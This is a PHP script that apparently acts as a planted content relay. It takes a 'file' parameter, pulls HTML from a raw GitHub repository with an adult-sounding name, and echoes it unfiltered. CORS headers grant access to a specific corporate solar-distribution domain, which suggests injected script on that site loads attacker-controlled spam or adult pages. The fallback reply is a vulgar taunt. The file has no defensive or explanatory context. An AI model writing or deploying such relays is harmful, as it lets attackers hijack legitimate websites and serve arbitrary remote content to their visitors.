<?php

header('Access-Control-Allow-Origin: https://solar-distribution.baywa-re.com');
header('Access-Control-Allow-Methods: GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: text/html; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

$file = isset($_GET['file']) ? basename($_GET['file']) : '';

if (empty($file)) {
    echo 'Natok Kom Chodawo Pio!';
    exit;
}

$githubUrl = 'https://raw.githubusercontent.com/xnxxusa/eduhaes/main/xox/video/' . rawurlencode($file) . '.html';

$context = stream_context_create([
    'http' => [
        'timeout' => 10,
        'follow_location' => 1,
        'user_agent' => 'Mozilla/5.0'
    ]
]);

$content = @file_get_contents($githubUrl, false, $context);

if ($content !== false) {
    echo $content;
} else {
    echo 'Natok Kom Chodawo Pio!';
}
?>
